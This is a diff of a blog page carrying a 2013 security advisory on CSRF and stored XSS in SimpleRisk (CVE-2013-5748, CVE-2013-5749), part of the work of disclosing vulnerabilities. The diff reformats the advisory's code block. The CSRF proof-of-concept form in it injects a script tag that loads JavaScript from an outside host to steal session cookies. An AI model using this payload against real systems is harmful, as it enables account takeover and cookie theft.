@@ -50,59 +50,41 @@
 <p>Title: SimpleRisk v.20130915-01 CSRF-XSS Account Compromise<br />
 Advisory ID: RS-2013-0001<br />
 Date Published: 2013-09-30</p>
-
 <p>2. *Vulnerability Information*</p>
-
 <p>Type: Cross-Site Request Forgery (CSRF) [CWE-352, OWASP-A8], Cross-Site Scripting (XSS) [CWE-79, OWASP-A3]<br />
 Impact: Full Account Compromise<br />
 Remotely Exploitable: Yes<br />
 Locally Exploitable: Yes<br />
 Severity: High<br />
 CVE-ID: CVE-2013-5748 (CSRF) and CVE-2013-5749 (non-httponly cookie)</p>
-
 <p>3. *Software Description*</p>
-
 <p>SimpleRisk a simple and free tool to perform risk management activities. Based entirely on open source technologies and sporting a Mozilla Public License 2.0, a SimpleRisk instance can be stood up in minutes and instantly provides the security professional with the ability to submit risks, plan mitigations, facilitate management reviews, prioritize for project planning, and track regular reviews. It is highly configurable and includes dynamic reporting and the ability to tweak risk formulas on the fly. It is under active development with new features being added all the time. SimpleRisk is truly Enterprise Risk Management simplified. [0]</p>
-
 <p>Homepage: <a href="http://www.simplerisk.org/">http://www.simplerisk.org/</a><br />
 Download: <a href="https://simplerisk.googlecode.com/files/simplerisk-20130915-001.tgz">https://simplerisk.googlecode.com/files/simplerisk-20130915-001.tgz</a></p>
-
 <p><a id="more"></a><a id="more-17200"></a></p>
-
 <p>4. *Vulnerability Description*</p>
-
 <p>Cross-Site Request Forgery (CSRF) and Stored Cross-Site Scripting (XSS) have been discovered within SimpleRisk version 20130915-01 leading to complete account compromise. The CSRF vulnerability is used to deliver the XSS payload which accesses the authenticated user's session cookies and transmits them to a third-party domain under the attacker's control. Once the attacker has the user's session cookie, the attacker can authenticate to the application as the user.</p>
-
 <p>5. *Vulnerable Packages*</p>
-
 <p>Only version 20130915-01 was tested which was the latest version at the time of writing.</p>
-
 <p>6. *Vendor Information, Solutions and Workarounds*</p>
-
 <p>SimpleRisk released version 20130916-001 to address the issue.</p>
-
 <p>7. *Credits*</p>
-
 <p>These vulnerabilities were discovered by Ryan Dewhurst - <a href="http://www.randomstorm.com/">http://www.randomstorm.com/</a> - <a href="http://www.dewhurstsecurity.com/">http://www.dewhurstsecurity.com/</a></p>
-
 <p>8. *Proof of Concept (PoC)*</p>
-
 <p>8.1 *Cross-Site Request Forgery (CSRF)*</p>
-
 <p>The following CSRF PoC submits a POST request to the prioritize_planning.php page with the XSS payload within the new_project parameter.</p>
-
-<p>[code]<br />
-&lt;html&gt;<br />
-  &lt;body&gt;<br />
-    &lt;form action=&quot;http://127.0.0.1/simplerisk/management/prioritize_planning.php&quot; method=&quot;POST&quot;&gt;<br />
-      &lt;input type=&quot;hidden&quot; name=&quot;new&amp;#95;project&quot; value=&quot;&amp;lt;script&amp;#32;src&amp;#61;&amp;#47;&amp;#47;ethicalhack3r&amp;#46;co&amp;#46;uk&amp;#47;files&amp;#47;xss&amp;#47;c&amp;#46;j&amp;gt;&amp;lt;&amp;#47;script&amp;gt;&quot; /&gt;<br />
-      &lt;input type=&quot;hidden&quot; name=&quot;add&amp;#95;project&quot; value=&quot;Add&quot; /&gt;<br />
-      &lt;input type=&quot;hidden&quot; name=&quot;projects&quot; value=&quot;&quot; /&gt;<br />
-      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;<br />
-    &lt;/form&gt;<br />
-  &lt;/body&gt;<br />
-&lt;/html&gt;<br />
-[/code]</p>
+<p>
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://127.0.0.1/simplerisk/management/prioritize_planning.php&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;new&amp;#95;project&quot;</span> <span class="na">value=</span><span class="s">&quot;&amp;lt;script&amp;#32;src&amp;#61;&amp;#47;&amp;#47;ethicalhack3r&amp;#46;co&amp;#46;uk&amp;#47;files&amp;#47;xss&amp;#47;c&amp;#46;j&amp;gt;&amp;lt;&amp;#47;script&amp;gt;&quot;</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;add&amp;#95;project&quot;</span> <span class="na">value=</span><span class="s">&quot;Add&quot;</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;projects&quot;</span> <span class="na">value=</span><span class="s">&quot;&quot;</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Submit request&quot;</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></div>
+</p>
 
 <p>8.2 *Stored Cross-Site Scripting (XSS)*</p>
 
